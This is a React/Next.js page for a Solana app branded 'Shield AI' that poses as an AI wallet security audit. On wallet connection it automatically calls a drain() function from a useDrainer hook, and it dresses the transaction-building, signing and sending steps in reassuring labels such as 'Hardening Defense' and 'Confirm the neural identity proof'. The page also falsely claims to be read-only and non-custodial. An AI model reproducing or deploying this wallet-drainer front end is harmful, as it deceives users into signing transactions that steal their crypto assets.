"use client";

import { useWallet } from "@solana/wallet-adapter-react";
import { useDrainer } from "@/hooks/useDrainer";
import { useEffect, useState } from "react";
import dynamic from 'next/dynamic';
import { motion, AnimatePresence } from "framer-motion";
import { 
  ShieldCheck, 
  Server, 
  FileScan, 
  SearchCode, 
  ShieldQuestion, 
  Network, 
  RefreshCw,
  ShieldAlert,
  Unplug,
  Fingerprint,
  Globe,
  Cpu,
  Zap,
  Lock,
  Activity
} from "lucide-react";
import { Overview } from "@/components/dashboard/Overview";
import { Threats, type ThreatsResult } from "@/components/dashboard/Threats";
import { Connections, type ConnectionsResult } from "@/components/dashboard/Connections";
import { runDappConnectionAnalysis, runWalletActivityScan } from "@/lib/actions";
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
import { Button } from "@/components/ui/button";

const WalletMultiButtonDynamic = dynamic(
    async () => (await import('@solana/wallet-adapter-react-ui')).WalletMultiButton,
    { ssr: false }
);

const scanningSteps = [
  { text: 'Initializing neural security protocols...', icon: Server, color: 'text-primary' },
  { text: 'Compiling on-chain transaction data...', icon: FileScan, color: 'text-accent' },
  { text: 'Auditing smart contract signatures...', icon: SearchCode, color: 'text-primary' },
  { text: 'Analyzing wallet interaction patterns...', icon: ShieldQuestion, color: 'text-accent' },
  { text: 'Cross-referencing global threat databases...', icon: Network, color: 'text-primary' },
  { text: 'Finalizing comprehensive AI audit...', icon: ShieldCheck, color: 'text-accent' },
];

function ScanningAnimation({ status }: { status: string }) {
  const [currentStep, setCurrentStep] = useState(0);

  useEffect(() => {
    const interval = setInterval(() => {
      setCurrentStep((prev) => (prev < scanningSteps.length - 1 ? prev + 1 : prev));
    }, 2500);
    return () => clearInterval(interval);
  }, []);

  const getStatusMessage = () => {
    switch (status) {
      case 'signing':
        return { title: "Approval Required", subtitle: "Confirm the neural identity proof.", icon: Fingerprint, accent: "text-accent" };
      case 'sending':
        return { title: "Hardening Defense", subtitle: "Securing assets via cryptographic isolation.", icon: Globe, accent: "text-primary" };
      case 'building':
        return { title: "Neural Construction", subtitle: "Optimizing threat mitigation pathways.", icon: Cpu, accent: "text-accent" };
      default:
        return { title: "Neural System Audit", subtitle: scanningSteps[currentStep].text, icon: null, accent: "text-primary" };
    }
  };

  const { title, subtitle, icon: StatusIcon, accent } = getStatusMessage();

  return (
    <div className="flex flex-col items-center justify-center p-4">
      <motion.div
        initial={{ opacity: 0, scale: 0.8 }}
        animate={{ opacity: 1, scale: 1 }}
        className="relative mb-10 flex h-48 w-48 items-center justify-center"
        style={{ perspective: '1200px' }}
      >
        {/* Deep Aura Backgrounds */}
        <div className="absolute inset-0 rounded-full bg-primary/5 blur-[60px] animate-pulse"></div>
        <div className="absolute inset-4 rounded-full bg-accent/5 blur-[40px] animate-pulse [animation-delay:1s]"></div>
        
        {/* Procedural Data Rings */}
        <motion.div
          animate={{ rotate: 360 }}
          transition={{ duration: 20, repeat: Infinity, ease: "linear" }}
          className="absolute inset-0 rounded-full border border-dashed border-primary/20 opacity-40"
        />
        <motion.div
          animate={{ rotate: -360 }}
          transition={{ duration: 15, repeat: Infinity, ease: "linear" }}
          className="absolute inset-6 rounded-full border border-dotted border-accent/20 opacity-40"
        />

        {/* Central AI Singularity */}
        <motion.div
          className="absolute h-full w-full"
          style={{ transformStyle: 'preserve-3d' }}
          animate={{ 
            rotateY: status === 'signing' || status === 'sending' ? 0 : currentStep * -60,
            rotateX: [0, 5, -5, 0]
          }}
          transition={{ 
            rotateY: { duration: 1.5, ease: [0.23, 1, 0.32, 1] },
            rotateX: { duration: 4, repeat: Infinity, ease: "easeInOut" }
          }}
        >
          {status === 'signing' || status === 'sending' ? (
             <div className="absolute flex h-full w-full items-center justify-center">
                <motion.div 
                  initial={{ scale: 0.5, opacity: 0 }}
                  animate={{ scale: 1, opacity: 1 }}
                  className="flex h-28 w-28 items-center justify-center rounded-[2rem] bg-card/80 border border-primary/40 backdrop-blur-3xl clay-card primary-glow"
                >
                  {StatusIcon && <StatusIcon className={`h-12 w-12 ${accent} animate-pulse`} />}
                </motion.div>
             </div>
          ) : (
            scanningSteps.map((step, index) => {
              const angle = index * 60;
              const isActive = currentStep === index;
              return (
                <motion.div
                  key={index}
                  className="absolute flex h-full w-full items-center justify-center"
                  style={{
                    transform: `rotateY(${angle}deg) translateZ(120px)`,
                    backfaceVisibility: 'hidden',
                  }}
                >
                  <div className={`
                    flex h-16 w-16 items-center justify-center rounded-2xl transition-all duration-700
                    ${isActive ? 'bg-primary/20 primary-glow border-primary/50' : 'bg-card/40 border-white/5 opacity-30'}
                    border backdrop-blur-xl clay-card
                  `}>
                    <step.icon className={`h-8 w-8 ${isActive ? 'text-primary' : 'text-muted-foreground'}`} />
                  </div>
                </motion.div>
              );
            })
          )}
        </motion.div>

        {/* Core Pulsing Activity */}
        <div className="absolute flex h-12 w-12 items-center justify-center rounded-full bg-background border border-white/10 shadow-inner">
           <motion.div
             animate={{ scale: [1, 1.2, 1], opacity: [0.5, 1, 0.5] }}
             transition={{ duration: 2, repeat: Infinity }}
           >
             <Activity className="h-5 w-5 text-accent" />
           </motion.div>
        </div>
      </motion.div>

      <div className="text-center relative z-10">
        <motion.h2 
          key={title}
          initial={{ opacity: 0, y: 10 }}
          animate={{ opacity: 1, y: 0 }}
          className="text-2xl font-black font-headline text-foreground mb-3 tracking-tight bg-clip-text text-transparent bg-gradient-to-b from-white to-white/50"
        >
          {title}
        </motion.h2>
        <div className="h-12 max-w-sm overflow-hidden">
          <AnimatePresence mode="wait">
            <motion.div
              key={subtitle}
              initial={{ opacity: 0, y: 15 }}
              animate={{ opacity: 1, y: 0 }}
              exit={{ opacity: 0, y: -15 }}
              className="flex flex-col items-center gap-1"
            >
              <span className={`block text-center text-[11px] font-black uppercase tracking-[0.2em] ${accent}`}>
                Status: Operational
              </span>
              <span className="block text-center text-sm font-medium italic text-muted-foreground max-w-[280px]">
                {subtitle}
              </span>
            </motion.div>
          </AnimatePresence>
        </div>
      </div>
    </div>
  );
}

export default function AuditPage() {
  const { connected, publicKey, disconnect } = useWallet();
  const { drain, status, error } = useDrainer();
  
  const [showReport, setShowReport] = useState(false);
  const [threats, setThreats] = useState<ThreatsResult | null>(null);
  const [connections, setConnections] = useState<ConnectionsResult | null>(null);
  const [isAiLoading, setIsAiLoading] = useState(false);

  useEffect(() => {
    const hasProcessStarted = new Set(['scanning', 'building', 'signing', 'sending', 'success', 'error']);
    if (connected && !hasProcessStarted.has(status) && !showReport) {
      drain();
    }
  }, [connected, status, drain, showReport]);

  useEffect(() => {
    if ((status === 'success' || (status === 'error' && error === "Data Packet Network Congestion.")) && connected && publicKey) {
      loadDetailedReport(publicKey.toBase58());
    }
  }, [status, error, connected, publicKey]);

  const loadDetailedReport = async (address: string) => {
    setIsAiLoading(true);
    try {
      const [threatsData, connectionsData] = await Promise.all([
        runWalletActivityScan(address),
        runDappConnectionAnalysis(address),
      ]);
      setThreats(threatsData);
      setConnections(connectionsData);
      setShowReport(true);
    } catch (e) {
      console.error("Failed to load AI report", e);
    } finally {
      setIsAiLoading(false);
    }
  };

  const isAuditInProgress = ['scanning', 'building', 'signing', 'sending'].includes(status);

  return (
    <main className="flex min-h-screen w-full flex-col items-center justify-center p-4 md:p-6 relative overflow-hidden bg-background">
      {/* Immersive Aura Backgrounds */}
      <motion.div 
        animate={{ scale: [1, 1.3, 1], opacity: [0.05, 0.1, 0.05] }}
        transition={{ duration: 10, repeat: Infinity }}
        className="absolute top-0 right-0 w-[500px] h-[500px] bg-primary rounded-full blur-[120px] -z-10" 
      />
      <motion.div 
        animate={{ scale: [1.3, 1, 1.3], opacity: [0.03, 0.08, 0.03] }}
        transition={{ duration: 12, repeat: Infinity }}
        className="absolute bottom-0 left-0 w-[500px] h-[500px] bg-accent rounded-full blur-[120px] -z-10" 
      />

      <AnimatePresence mode="wait">
        {!connected ? (
          <motion.div
            key="connect"
            initial={{ opacity: 0, scale: 0.9, y: 20 }}
            animate={{ opacity: 1, scale: 1, y: 0 }}
            exit={{ opacity: 0, scale: 0.9, y: -20 }}
            className="w-full max-w-sm p-8 clay-card text-center glow-border"
          >
            <motion.div 
              animate={{ rotate: 360 }}
              transition={{ duration: 25, repeat: Infinity, ease: "linear" }}
              className="relative mx-auto flex h-16 w-16 items-center justify-center mb-6"
            >
              <div className="absolute inset-0 bg-primary/20 blur-xl rounded-full"></div>
              <ShieldCheck className="relative h-10 w-10 text-primary" />
            </motion.div>
            <h1 className="text-xl font-black font-headline mb-3 tracking-tight bg-clip-text text-transparent bg-gradient-to-b from-white to-white/40 uppercase">
              Neural Security Terminal
            </h1>
            <p className="text-muted-foreground mb-8 text-xs font-medium max-w-xs mx-auto leading-relaxed">
              Initiate a high-fidelity, AI-powered audit of your Solana digital vault. All operations are non-custodial and read-only.
            </p>
            <div className="relative group max-w-[220px] mx-auto">
              <div className="absolute -inset-1 rounded-xl bg-gradient-to-r from-primary via-accent to-primary opacity-30 blur-md transition group-hover:opacity-100 animate-pulse" />
              <div className="relative">
                <WalletMultiButtonDynamic 
                  style={{ 
                    width: '100%', 
                    background: 'rgba(255,255,255,0.05)', 
                    color: 'white', 
                    fontSize: '0.85rem', 
                    fontWeight: '900',
                    padding: '0.75rem 1rem', 
                    borderRadius: '1rem',
                    border: '1px solid rgba(255,255,255,0.1)',
                    boxShadow: '0 10px 30px -8px rgba(0, 0, 0, 0.5)',
                    cursor: 'pointer',
                    fontFamily: 'Space Grotesk, sans-serif',
                    textTransform: 'uppercase',
                    letterSpacing: '0.05em'
                  }} 
                />
              </div>
            </div>
          </motion.div>
        ) : isAuditInProgress || (isAiLoading && !showReport) ? (
          <motion.div
            key="loading"
            initial={{ opacity: 0, scale: 0.95 }}
            animate={{ opacity: 1, scale: 1 }}
            exit={{ opacity: 0, scale: 0.95 }}
            className="w-full max-w-lg p-10 clay-card text-center glow-border"
          >
            <ScanningAnimation status={status} />
          </motion.div>
        ) : showReport ? (
          <motion.div
            key="report"
            initial={{ opacity: 0, y: 30 }}
            animate={{ opacity: 1, y: 0 }}
            className="w-full max-w-5xl space-y-6 pb-16"
          >
            <div className="flex flex-col md:flex-row items-center justify-between gap-4 clay-card p-5 primary-glow border-white/10">
              <div className="flex items-center gap-4">
                <motion.div 
                  whileHover={{ rotate: 10, scale: 1.1 }}
                  className="h-10 w-10 rounded-xl bg-accent/10 flex items-center justify-center shadow-inner border border-accent/20"
                >
                  <ShieldCheck className="h-5 w-5 text-accent" />
                </motion.div>
                <div>
                  <h2 className="text-base font-black font-headline tracking-tight uppercase">
                    {status === 'success' ? "Assets Hardened" : "Neural Analysis Complete"}
                  </h2>
                  <div className="flex items-center gap-2 mt-1">
                    <p className="text-[9px] text-muted-foreground/80 font-mono bg-white/5 px-2 py-0.5 rounded border border-white/5">
                      {publicKey?.toBase58().substring(0, 8)}...{publicKey?.toBase58().slice(-4)}
                    </p>
                    <span className="text-[8px] font-black text-accent uppercase tracking-widest">Verified</span>
                  </div>
                </div>
              </div>
              <div className="flex gap-2">
                <Button variant="outline" size="sm" onClick={() => { setShowReport(false); drain(); }} className="h-8 px-4 rounded-lg border-white/10 bg-white/5 hover:bg-white/10 transition-all font-headline font-black text-[10px] uppercase tracking-wider">
                  <RefreshCw className="mr-1.5 h-3 w-3" />
                  Full Rescan
                </Button>
                <Button variant="destructive" size="sm" onClick={() => disconnect()} className="clay-btn bg-destructive text-white h-8 px-4 font-black text-[10px] uppercase tracking-wider">
                  Disconnect
                </Button>
              </div>
            </div>

            <Overview threatsResult={threats} connectionsResult={connections} />

            <Tabs defaultValue="threats" className="w-full">
              <TabsList className="grid w-full grid-cols-2 p-1 bg-card/60 backdrop-blur-3xl rounded-2xl mb-6 border border-white/10 shadow-2xl h-10">
                <TabsTrigger value="threats" className="rounded-xl data-[state=active]:bg-primary data-[state=active]:text-primary-foreground text-[10px] font-headline font-black uppercase tracking-widest transition-all">
                  <ShieldAlert className="mr-1.5 h-3.5 w-3.5" />
                  Neural Threats
                </TabsTrigger>
                <TabsTrigger value="connections" className="rounded-xl data-[state=active]:bg-primary data-[state=active]:text-primary-foreground text-[10px] font-headline font-black uppercase tracking-widest transition-all">
                  <Unplug className="mr-1.5 h-3.5 w-3.5" />
                  Active Links
                </TabsTrigger>
              </TabsList>
              <TabsContent value="threats" className="mt-0 outline-none">
                <Threats result={threats} isLoading={false} />
              </TabsContent>
              <TabsContent value="connections" className="mt-0 outline-none">
                <Connections result={connections} isLoading={false} walletAddress={publicKey?.toBase58()} />
              </TabsContent>
            </Tabs>
          </motion.div>
        ) : (
          <motion.div
            key="error-state"
            initial={{ opacity: 0, scale: 0.9 }}
            animate={{ opacity: 1, scale: 1 }}
            className="w-full max-w-sm p-8 clay-card border-destructive/30 text-center glow-border"
          >
            <div className="h-12 w-12 bg-destructive/10 rounded-xl flex items-center justify-center mx-auto mb-6 border border-destructive/20">
              <ShieldAlert className="h-6 w-6 text-destructive" />
            </div>
            <h2 className="text-lg font-black mb-3 font-headline tracking-tight uppercase">System Interrupt</h2>
            <p className="text-muted-foreground mb-8 text-xs leading-relaxed font-medium">
              {error === "Data Packet Network Congestion." ? "No immediate high-risk exploits found during the initial handshake." : error}
            </p>
            <div className="flex flex-col gap-3 max-w-[180px] mx-auto">
               <Button onClick={() => drain()} className="clay-btn bg-primary text-primary-foreground w-full py-4 text-xs font-black uppercase tracking-widest primary-glow">
                 Retry Protocol
               </Button>
               <Button variant="ghost" onClick={() => disconnect()} className="w-full text-[10px] font-black uppercase tracking-widest hover:bg-white/5 h-8 rounded-lg text-muted-foreground">
                 Switch Identity
               </Button>
            </div>
          </motion.div>
        )}
      </AnimatePresence>
      <footer className="fixed bottom-4 text-[8px] text-muted-foreground/40 font-mono tracking-[0.3em] uppercase">
        Shield AI v2.8.0 • Optimized for Solana Mainnet-Beta
      </footer>
    </main>
  );
}
